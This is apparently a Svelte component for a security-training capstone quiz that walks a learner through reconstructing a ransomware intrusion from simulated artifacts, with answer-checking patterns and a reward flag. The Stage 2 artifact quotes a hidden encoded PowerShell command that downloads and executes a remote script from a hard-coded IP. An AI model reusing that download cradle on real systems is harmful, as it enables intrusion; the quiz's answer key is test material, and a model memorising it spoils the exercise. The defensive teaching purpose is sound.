<script>
  import { progress, setObj } from '../stores/progress.js';

  const CAP = [
    { obj: 'access', title: 'Stage 1 · Initial access', art: 'EMAIL\n  From: billing@inv0ice-corp.com\n  Attachment: invoice_2026.xlsm  (macro-enabled spreadsheet)', q: 'Attachment file type that delivered it?', test: v => /xlsm|macro|excel|spreadsheet/i.test(v), fb: 'Macro-enabled Office doc → user-enabled macros = initial access.' },
    { obj: 'exec', title: 'Stage 2 · Execution', art: "PROCESS\n  excel.exe → cmd.exe → powershell.exe -nop -w hidden -enc SUVYIChOZXct...\n  (decodes to: IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/x.ps1'))", q: 'What executed the payload? (interpreter)', test: v => /powershell|iex|pwsh/i.test(v), fb: 'Macro spawned PowerShell with a download cradle — living off the land.' },
    { obj: 'c2', title: 'Stage 3 · Command & control', art: 'PCAP\n  10.0.2.15 → 185.220.101.47:443 every ~60s, low jitter (beacon)', q: 'C2 IP address?', test: v => /185\.220\.101\.47/.test(v), fb: 'Periodic beacon to a hardcoded IP = C2 channel.' },
    { obj: 'impact', title: 'Stage 4 · Impact', art: 'HOST\n  CryptEncrypt over *.docx/*.xlsx, files renamed *.vault, READ_ME.vault.txt dropped', q: 'Attacker objective / impact?', test: v => /ransom|encrypt|impact/i.test(v), fb: 'Mass encryption + ransom note = ransomware. Chain reconstructed.' },
  ];

  let stage = 0;
  let answer = '';
  let fb = null;

  function submit() {
    const st = CAP[stage];
    if (!st) return;
    if (st.test(answer)) {
      setObj('capstone', st.obj, progress);
      fb = { kind: 'hl', text: '[+] ' + st.fb };
      setTimeout(() => { stage++; answer = ''; fb = null; }, 900);
    } else {
      fb = { kind: 'err', text: '[-] not quite — re-read the artifact.' };
    }
  }
  function restart() { stage = 0; answer = ''; fb = null; }
</script>

{#if stage >= CAP.length}
  <div class="objbox">
    <h4>Case closed</h4>
    <p style="color:var(--ash)">You reconstructed the full chain: <b style="color:var(--bone)">phishing → PowerShell execution → C2 beacon (185.220.101.47) → ransomware</b>. Every Map phase shows up in one real intrusion.</p>
    <div class="pktdetail" style="margin-top:10px"><span class="hl">BV{'{'}capst0ne_cl0s3d{'}'}</span></div>
    <button class="btn" style="margin-top:10px" on:click={restart}>Run it again ↺</button>
  </div>
{:else}
  {@const st = CAP[stage]}
  <p class="lede" style="margin-top:0">Stage {stage + 1} of {CAP.length}. Make the call at each step; a correct answer unlocks the next stage.</p>
  <div class="casebar"><span>STAGE: <b>{stage + 1}/{CAP.length}</b></span><span><a style="cursor:pointer;color:var(--volt)" on:click={restart}>↺ Restart</a></span></div>
  <div class="repane"><h5>{st.title}</h5><div class="pktdetail" style="border:0">{st.art}</div></div>
  <div class="findform" style="margin-top:12px"><div class="full"><label>{st.q}</label><input placeholder="your answer" bind:value={answer} on:keydown={e => e.key === 'Enter' && submit()}></div></div>
  <div style="margin-top:10px"><button class="btn" on:click={submit}>Submit ▸</button></div>
  {#if fb}<div class="verdict" style="margin-top:10px"><span class={fb.kind}>{fb.text}</span></div>{/if}
  <div class="hintbox"><b>Capstone:</b> this is the whole track fused — disk/format/asm skills read the artifacts, static/dynamic/memory/network skills produce the findings, and you narrate the kill chain end to end.</div>
{/if}
